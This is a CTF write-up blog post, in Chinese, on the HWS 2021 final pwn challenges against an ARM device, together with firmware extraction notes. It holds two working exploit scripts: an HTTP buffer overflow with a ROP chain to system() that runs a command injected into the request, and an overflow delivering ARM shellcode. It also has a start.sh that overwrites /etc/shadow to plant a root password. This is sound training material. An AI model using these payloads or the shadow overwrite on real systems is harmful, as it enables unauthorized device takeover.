---
title: HWS 2021 结营赛 Pwn
date: 2021-03-06 00:00:00
categories:
- CTF/Pwn
tags: 
---

> 更新中...结营赛还有非常多值得探索的东西

- 结营赛题目附件：[HWS2021结营赛题目.zip](https://xuanxuanblingbling.github.io/assets/attachment/HWS2021结营赛题目.zip)

- [Yibai Zhang: HWS2021决赛WriteUp](https://www.summershrimp.com/2021/03/HWS2021%E5%86%B3%E8%B5%9BWriteUp/)
- [x1ng: HWS冬令营结营赛](https://x1ng.top/2021/03/01/HWS%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9B/)
- [x1ng: 侧信道与故障注入攻击](https://x1ng.top/2021/02/26/%E4%BE%A7%E4%BF%A1%E9%81%93%E4%B8%8E%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/)

## Pwn1: easyserver

> 串口看输出

```python
from pwn import *
#context.log_level = 'debug'

p = remote('20.21.2.27', 59816)

pop_r0_pc = 0x0006099c
cmd_base = 0x008ACE4
system = 0x00019158

cmd = 'cat /tmp/207775d1ee9b9efa245fd9fb6fc03b68/flag'
payload  = 'POST ./ HTTP1.1;'+cmd+'; \r\n'
payload += 'a'*1100+p32(pop_r0_pc)+ p32(cmd_base+13) + p32(system) +cyclic(100)+'\r\n'+'\r\n'+'\r\n'
print payload

p.send(payload)
p.interactive()
```

![image](https://xuanxuanblingbling.github.io/assets/pic/hws/pwn1.png)


## Pwn3: babyhttpd

> 串口看输出

```python
from pwn import *
#context.log_level = 'debug'
context(arch='arm')

# shellcode  = asm('''
# add   r4, pc, #56
# str   r4, [sp, #8]
# sub   r2, r2, r2 
# strb  r2, [r4, #4] 

# sub   r2, r2, r2       
# add   r3, pc, #28      
# str   r3, [sp, #4]     
# str   r2, [sp, #12]     
# mov   r0, r3, lsl r2   
# strb  r2, [r3, #7]     
# add   r3, pc, #4       
# add   r1, sp, #4       
# strb  r2, [r3, #1]     
# swi   0x90ff0b         
# ''')+'/bin/ls//tmp'


shellcode  = asm('''
add   r4, pc, #60
str   r4, [sp, #8]
sub   r2, r2, r2 
strb  r2, [r4, #25] 

sub   r2, r2, r2       
add   r3, pc, #28      
str   r3, [sp, #4]     
str   r2, [sp, #12]     
mov   r0, r3, lsl r2   
strb  r2, [r3, #8]     
add   r3, pc, #4       
add   r1, sp, #4       
strb  r2, [r3, #1]     
swi   0x90ff0b         
''')+'/bin/cat/////tmp/ffffffllllaaaaaagggg'

p = remote('20.21.2.27', 5000)

payload  = 'POST /'+"\x11"*6+shellcode+'\r\n\r\n'
payload += 'name='+'a'*655+p32(0x22504)+'&bbb=./;'

p.send(payload)
p.interactive()
```

![image](https://xuanxuanblingbling.github.io/assets/pic/hws/pwn3.png)

## 板子拿shell

### jffs2解包

```sh
# Install jefferson to extract JFFS2 file systems
$ sudo pip install cstruct
$ git clone https://github.com/sviehb/jefferson
$ (cd jefferson && sudo python setup.py install)
```

```sh
binwalk -Me test.img
```

### jffs2打包

```sh
sudo apt install mtd-utils
mkfs.jffs2 -r rootfs -o rootfs.img 
```

### 修改start.sh

```sh
#!/bin/sh
cp -r /etc /tmp/
echo 'root:$1$NqxdI63c$nzvMkcJxzktGW6Tsgw3jb0:1::::::' > /tmp/etc/shadow
mount -o loop /tmp/etc/ /etc
```

## dfu读写固件

> 安恒板子开机自动进入dfu，若3s无操作继续启动

![image](https://xuanxuanblingbling.github.io/assets/pic/hws/dfu.png)

```c
➜  dfu-util -l
Found DFU: [1f3a:1010] ver=0215, devnum=19, cfg=1, intf=0, path="20-4.2.3", alt=4, name="vendor", serial="UNKNOWN"
Found DFU: [1f3a:1010] ver=0215, devnum=19, cfg=1, intf=0, path="20-4.2.3", alt=3, name="rom", serial="UNKNOWN"
Found DFU: [1f3a:1010] ver=0215, devnum=19, cfg=1, intf=0, path="20-4.2.3", alt=2, name="kernel.itb", serial="UNKNOWN"
Found DFU: [1f3a:1010] ver=0215, devnum=19, cfg=1, intf=0, path="20-4.2.3", alt=1, name="u-boot", serial="UNKNOWN"
Found DFU: [1f3a:1010] ver=0215, devnum=19, cfg=1, intf=0, path="20-4.2.3", alt=0, name="all", serial="UNKNOWN"
```

读取固件：

```c
➜  dfu-util -U vendor.bin -a vendor
➜  dfu-util -U rom.bin -a rom
➜  dfu-util -U kernel.bin -a kernel.itb
➜  dfu-util -U u-boot.bin -a u-boot
➜  dfu-util -U all.bin -a all
```

刷写固件：

```c
➜  dfu-util -D vendor.bin -a vendor
➜  dfu-util -D rom.bin -a rom
➜  dfu-util -D kernel.bin -a kernel.itb
➜  dfu-util -D u-boot.bin -a u-boot
➜  dfu-util -D all.bin -a all
```

虽然是spi-nand，但是all.bin为128M，所以是纯数据，没有oob：

```c
➜  ls -alh 
drwxr-xr-x  10   320B 10 17 09:47 .
drwx------@ 40   1.3K 10 17 09:28 ..
-rw-r--r--   1   128M 10 17 09:52 all.bin
-rw-r--r--   1   5.0M 10 17 09:47 kernel.bin
-rw-r--r--   1    42M 10 17 09:47 rom.bin
-rw-r--r--   1   512K 10 17 09:47 u-boot.bin
-rw-r--r--   1    16M 10 17 09:44 vendor.bin
```

### dfu分区原理

dfu的分区表在u-boot的环境变量中：

- [联咏NT9852x(NT98529/NT98528/NT98520/NT98525)DFU用户指南](https://bbs.16rd.com/thread-578110-1-1.html)
- [uboot/doc/README.dfu](https://github.com/Caesar-github/uboot/blob/master/doc/README.dfu)

```c
=> printenv dfu_alt_info
dfu_alt_info=all raw 0x0 0x8000000;u-boot raw 0x0 0x80000;kernel.itb raw 0x100000 0x500000;rom raw 0x600000 0x2a00000;vendor raw 0x3000000 0x1000000

=> mtd list
List of MTD devices:
* spi-nand0
  - device: spi-nand@1
  - parent: spi@1c05000
  - driver: spi_nand
  - type: NAND flash
  - block size: 0x20000 bytes
  - min I/O: 0x800 bytes
  - OOB size: 64 bytes
  - OOB available: 24 bytes
  - 0x000000000000-0x000008000000 : "spi-nand0"
```

### 内核分区原理

而内核也知道分区：

```c
# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00100000 00020000 "u-boot"
mtd1: 00500000 00020000 "kernel"
mtd2: 02a00000 00020000 "rom"
mtd3: 01000000 00020000 "vendor"
mtd4: 03000000 00020000 "overlay"
```

一般分区会通过u-boot传递给内核或者固化在内核中：

- [u-boot中分区和内核MTD分区关系](https://www.cnblogs.com/lidabo/p/4774327.html)
- [Uboot--bootcmd和bootargs参数](https://adtxl.com/index.php/archives/457.html)
- [u-boot中查看分区建立和查看](https://blog.csdn.net/niepangu/article/details/50516130)

但分析发现分区表在设备树中：

```c
➜  scp -r root@20.21.2.27:/proc/device-tree ./device-tree

➜  brew install dtc
➜  sudo apt-get install device-tree-compiler

➜  dtc -I fs -O dts -o extracted.dts ./device-tree
```

```c
spi-nand@0 {
    #size-cells = <0x01>;
    reg = <0x00>;
    compatible = "spi-nand";
    spi-max-frequency = <0x2faf080>;
    #address-cells = <0x01>;

    partitions {
        #size-cells = <0x01>;
        compatible = "fixed-partitions";
        #address-cells = <0x01>;

        partition@3 {
            reg = <0x3000000 0x1000000>;
            label = "vendor";
        };

        partition@4 {
            reg = <0x4000000 0x3000000>;
            label = "overlay";
        };

        partition@2 {
            reg = <0x600000 0x2a00000>;
            label = "rom";
            read-only;
        };

        partition@0 {
            reg = <0x00 0x100000>;
            label = "u-boot";
            read-only;
        };

        partition@1 {
            reg = <0x100000 0x500000>;
            label = "kernel";
            read-only;
        };
    };
};
```

### 解开kernel

kernel打包格式为FIT：[u-boot FIT image介绍](http://www.wowotech.net/u-boot/fit_image_overview.html)，可以直接dd出kernel和设备树：

```c
➜  binwalk ./kernel.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Flattened device tree, size: 4586828 bytes, version: 17
204           0xCC            Linux kernel ARM boot executable zImage (little-endian)
32752         0x7FF0          gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)
4569144       0x45B838        Flattened device tree, size: 16319 bytes, version: 17

➜  dd if=./kernel.bin of=./kernel     bs=1 skip=0xCC        
➜  dd if=./kernel.bin of=./kernel.dtc bs=1 skip=0x45B838
```

也可以查看FIT的信息树：

```c
➜  dtc -I dtb -O dts ./kernel.bin -o kernel.dts
```

```c
/dts-v1/;

/ {
	timestamp = <0x603626d7>;
	description = "Generic Allwinner FIT Image";
	#address-cells = <0x01>;

	images {

		kernel@0 {
			description = "Linux kernel";
			data = <0xa0e1  ...
			type = "kernel";
			arch = "arm";
			os = "linux";
			compression = "none";
			load = <0x80000000>;
			entry = <0x80000000>;

			hash@0 {
				value = <0xfd5e11>;
				algo = "crc32";
			};
		};

		fdt@0 {
			description = "Flattened Device Tree blob";
			data = [d0 0d fe ed ...
			type = "flat_dt";
			arch = "arm";
			compression = "none";

			hash@0 {
				value = <0xfddde102>;
				algo = "crc32";
			};
		};
	};

	configurations {
		default = "conf@0";

		conf@0 {
			description = "Kernel, DeviceTree";
			kernel = "kernel@0";
			fdt = "fdt@0";

			hash@0 {
				algo = "crc32";
			};
		};
	};
};
```
